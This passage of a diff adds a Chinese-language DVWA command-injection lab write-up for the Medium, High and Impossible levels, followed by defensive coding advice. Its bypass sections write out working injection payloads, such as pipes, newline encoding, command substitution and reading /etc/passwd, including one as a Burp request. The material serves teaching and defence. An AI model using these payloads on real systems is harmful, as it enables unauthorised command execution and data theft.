class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>黑名单过滤</strong> - 过滤 <code>&amp;&amp;</code> 和 <code>;</code></li>
+</ol>
+<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><ol>
+<li><strong>黑名单不完整</strong> - 只过滤了2个字符，还有很多其他方式</li>
+<li><strong>没有过滤</strong> <code>|</code>、<code>||</code>、<code>&amp;</code>、换行符等</li>
+<li><strong>仍使用shell_exec()</strong></li>
+</ol>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：使用其他连接符"><a href="#方法1：使用其他连接符" class="headerlink" title="方法1：使用其他连接符"></a>方法1：使用其他连接符</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用单个&amp;（Windows）</span></span><br><span class="line">127.0.0.1 &amp; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用管道|</span></span><br><span class="line">127.0.0.1 | <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用||</span></span><br><span class="line">invalid_ip || <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用换行符（URL编码：%0A）</span></span><br><span class="line">127.0.0.1%0Awhoami</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：在Burp-Suite中测试"><a href="#方法2：在Burp-Suite中测试" class="headerlink" title="方法2：在Burp Suite中测试"></a>方法2：在Burp Suite中测试</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/dvwa/vulnerabilities/exec/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="language-arcade">ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>+|+cat+<span class="regexp">/etc/</span>passwd&amp;Submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：其他绕过技巧"><a href="#方法3：其他绕过技巧" class="headerlink" title="方法3：其他绕过技巧"></a>方法3：其他绕过技巧</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用$()命令替换</span></span><br><span class="line">127.0.0.1$(<span class="built_in">whoami</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用反引号``</span></span><br><span class="line">127.0.0.1`<span class="built_in">whoami</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用&amp;（单个，不是&amp;&amp;）</span></span><br><span class="line">127.0.0.1 &amp; <span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>更严格的黑名单，但仍有绕过方法。</p>
+<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 扩展的黑名单 ★★★</span></span><br><span class="line">    <span class="comment">// 增加了更多的命令连接符</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,   <span class="comment">// 单个&amp;</span></span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,   <span class="comment">// 分号</span></span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,   <span class="comment">// 管道+空格</span></span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,   <span class="comment">// 减号（防止ping参数注入）</span></span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,   <span class="comment">// 美元符号（防止命令替换$()）</span></span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,   <span class="comment">// 左括号（防止命令替换）</span></span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,   <span class="comment">// 右括号</span></span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,   <span class="comment">// 反引号（防止命令替换）</span></span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,   <span class="comment">// 逻辑或</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行替换</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行ping命令</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>更完整的黑名单</strong> - 过滤了 <code>&amp;</code>, <code>;</code>, <code>| </code>, <code>-</code>, <code>$</code>, <code>(</code>, <code>)</code>, <code>`</code>, <code>||</code></li>
+</ol>
+<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><ol>
+<li><strong>注意：只过滤了<code>| </code>（管道+空格）</strong> - 可以用<code>|</code>（无空格）绕过</li>
+<li><strong>没有过滤换行符</strong></li>
+<li><strong>黑名单仍不完全</strong></li>
+</ol>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：管道符不加空格"><a href="#方法1：管道符不加空格" class="headerlink" title="方法1：管道符不加空格"></a>方法1：管道符不加空格</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意：黑名单是 &#x27;| &#x27;（管道+空格）</span></span><br><span class="line"><span class="comment"># 我们用 &#x27;|&#x27;（只有管道，无空格）</span></span><br><span class="line">127.0.0.1|<span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><strong>原理：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 黑名单</span></span><br><span class="line"><span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>  <span class="comment">// 注意这里有空格</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们的输入</span></span><br><span class="line"><span class="string">&#x27;127.0.0.1|cat&#x27;</span>  <span class="comment">// 没有空格，不会被过滤！</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：使用换行符"><a href="#方法2：使用换行符" class="headerlink" title="方法2：使用换行符"></a>方法2：使用换行符</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL编码的换行符：%0A</span></span><br><span class="line">127.0.0.1%0Acat /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在Burp中测试</span></span><br><span class="line">ip=127.0.0.1%0Awhoami</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：组合绕过"><a href="#方法3：组合绕过" class="headerlink" title="方法3：组合绕过"></a>方法3：组合绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果单个方法被拦截，可以尝试组合</span></span><br><span class="line">127.0.0.1|<span class="built_in">cat</span>&lt;/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用白名单验证，几乎无法绕过。</p>
+<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查Anti-CSRF token</span></span><br><span class="line">    <span class="comment">// checkToken() - DVWA自定义函数，验证CSRF token</span></span><br><span class="line">    <span class="comment">// 作用：防止跨站请求伪造攻击</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护：stripslashes()去除反斜杠 ★★★</span></span><br><span class="line">    <span class="comment">// stripslashes() - 删除字符串中的反斜杠\</span></span><br><span class="line">    <span class="comment">// 作用：清理可能的转义字符</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 关键防护：白名单验证 - 将IP分割成数组 ★★★</span></span><br><span class="line">    <span class="comment">// explode() - 使用分隔符将字符串分割成数组</span></span><br><span class="line">    <span class="comment">// 参数1：分隔符（这里是&#x27;.&#x27;）</span></span><br><span class="line">    <span class="comment">// 参数2：要分割的字符串</span></span><br><span class="line">    <span class="comment">// 返回值：数组</span></span><br><span class="line">    <span class="comment">// 示例：&#x27;192.168.1.1&#x27; =&gt; [&#x27;192&#x27;, &#x27;168&#x27;, &#x27;1&#x27;, &#x27;1&#x27;]</span></span><br><span class="line">    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 验证IP格式：必须是4段 ★★★</span></span><br><span class="line">    <span class="comment">// is_numeric() - 检查变量是否为数字或数字字符串</span></span><br><span class="line">    <span class="comment">// count() - 计算数组元素个数</span></span><br><span class="line">    <span class="comment">// ( ( count( $octet ) == 4 ) - 确保IP地址有4个部分</span></span><br><span class="line">    <span class="comment">// is_numeric() - 确保每个部分都是数字</span></span><br><span class="line">    <span class="comment">// $octet[0] &gt;= 0 &amp;&amp; $octet[0] &lt;= 255 - 确保第1段在0-255范围内</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="title function_ invoke__">count</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="variable">$octet</span>[<span class="number">0</span>] &gt;= <span class="number">0</span> ) &amp;&amp; ( <span class="variable">$octet</span>[<span class="number">0</span>] &lt;= <span class="number">255</span> ) &amp;&amp; ( <span class="variable">$octet</span>[<span class="number">1</span>] &gt;= <span class="number">0</span> ) &amp;&amp; ( <span class="variable">$octet</span>[<span class="number">1</span>] &lt;= <span class="number">255</span>) &amp;&amp; ( <span class="variable">$octet</span>[<span class="number">2</span>] &gt;= <span class="number">0</span> ) &amp;&amp; ( <span class="variable">$octet</span>[<span class="number">2</span>] &lt;= <span class="number">255</span>) &amp;&amp; ( <span class="variable">$octet</span>[<span class="number">3</span>] &gt;= <span class="number">0</span> ) &amp;&amp; ( <span class="variable">$octet</span>[<span class="number">3</span>] &lt;= <span class="number">255</span>) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 重新组合已验证的IP ★★★</span></span><br><span class="line">        <span class="comment">// 使用已验证的数组重新构建IP字符串</span></span><br><span class="line">        <span class="comment">// 这样即使原始输入包含恶意内容，也会被丢弃</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行ping命令（现在是安全的）</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ★★★ IP格式不正确，输出错误信息 ★★★</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成新的Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><ol>
+<li><strong>CSRF Token验证</strong> - 防止跨站请求伪造</li>
+<li><strong>stripslashes()</strong> - 清理反斜杠</li>
+<li><strong>白名单验证</strong> - 只允许标准IP格式</li>
+<li><strong>IP格式严格验证</strong>：<ul>
+<li>必须4个部分</li>
+<li>每部分必须是数字</li>
+<li>每部分范围0-255</li>
+</ul>
+</li>
+<li><strong>重新构建输入</strong> - 使用验证后的数据重新组合</li>
+</ol>
+<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>白名单机制：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：127.0.0.1; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">验证过程：</span><br><span class="line">1. 分割：[<span class="string">&#x27;127&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1; whoami&#x27;</span>]</span><br><span class="line">2. 检查第4个元素：<span class="string">&#x27;1; whoami&#x27;</span></span><br><span class="line">3. is_numeric(<span class="string">&#x27;1; whoami&#x27;</span>) = <span class="literal">false</span> ❌</span><br><span class="line">4. 验证失败，拒绝执行</span><br><span class="line">5. 输出：ERROR: You have entered an invalid IP.</span><br></pre></td></tr></table></figure>
+
+<p><strong>任何注入尝试都会失败：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|<span class="built_in">whoami</span>    -&gt; count != 4 ❌</span><br><span class="line">127.0.0.1;<span class="built_in">whoami</span>    -&gt; count != 4 ❌</span><br><span class="line">127.0.0.1&amp;<span class="built_in">whoami</span>    -&gt; count != 4 ❌</span><br><span class="line">127.0.0.1%0Awhoami  -&gt; count != 4 ❌</span><br><span class="line">127.$(<span class="built_in">whoami</span>).0.1   -&gt; is_numeric($(<span class="built_in">whoami</span>)) = <span class="literal">false</span> ❌</span><br></pre></td></tr></table></figure>
+
+<p><strong>即使通过验证，也会被重新构建：</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="number">127.0</span>.<span class="number">0.1</span>（正常IP）</span><br><span class="line">验证：通过</span><br><span class="line">重新构建：<span class="variable">$octet</span><span class="selector-attr">[0]</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$octet</span><span class="selector-attr">[1]</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$octet</span><span class="selector-attr">[2]</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$octet</span><span class="selector-attr">[3]</span></span><br><span class="line">结果：<span class="number">127.0</span>.<span class="number">0.1</span>（原始恶意部分被丢弃）</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><ol>
+<li><p><strong>避免使用系统命令函数</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 危险函数（尽量避免）</span></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line">``（反引号）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>使用内置函数替代</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不要用shell命令</span></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping &#x27;</span> . <span class="variable">$ip</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用PHP内置函数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP)) &#123;</span><br><span class="line">    <span class="comment">// 执行操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>输入验证 - 白名单</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 严格的IP验证</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$input</span>, FILTER_VALIDATE_IP)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid IP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正则表达式验证</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;$/&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid format&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>使用参数化执行</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不要拼接字符串</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;ping &quot;</span> . <span class="variable">$user_input</span>;  <span class="comment">// 危险！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用escapeshellarg()</span></span><br><span class="line"><span class="variable">$safe_arg</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$user_input</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;ping &quot;</span> . <span class="variable">$safe_arg</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或使用escapeshellcmd()</span></span><br><span class="line"><span class="variable">$safe_cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$user_input</span>);</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h3><p><strong>escapeshellarg()</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 给参数加单引号并转义内部的单引号</span></span><br><span class="line"><span class="variable">$input</span> = <span class="string">&quot;127.0.0.1; whoami&quot;</span>;</span><br><span class="line"><span class="variable">$safe</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="comment">// 结果：&#x27;127.0.0.1; whoami&#x27;（作为一个参数）</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;ping -c 1 &quot;</span> . <span class="variable">$safe</span>);</span><br><span class="line"><span class="comment">// 执行：ping -c 1 &#x27;127.0.0.1; whoami&#x27;（会失败，但安全）</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>escapeshellcmd()</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 转义命令中的特殊字符</span></span><br><span class="line"><span class="variable">$input</span> = <span class="string">&quot;127.0.0.1; whoami&quot;</span>;</span><br><span class="line"><span class="variable">$safe</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="comment">// 结果：127.0.0.1\; whoami（;被转义）</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="架构层面"><a href="#架构层面" class="headerlink" title="架构层面"></a>架构层面</h3><ol>
+<li><p><strong>最小权限原则</strong></p>
+<ul>
+<li>Web服务器使用低权限用户（www-data）</li>
+<li>禁止sudo权限</li>
+<li>chroot监狱</li>
+</ul>
+</li>
+<li><p><strong>禁用危险函数</strong></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; php.ini</span></span><br><span class="line"><span class="attr">disable_functions</span> = exec,passthru,shell_exec,system,proc_open,popen</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>使用容器隔离</strong></p>
+<ul>
+<li>Docker容器</li>
+<li>限制容器权限</li>
+<li>只读文件系统</li>
+</ul>
+</li>
+</ol>
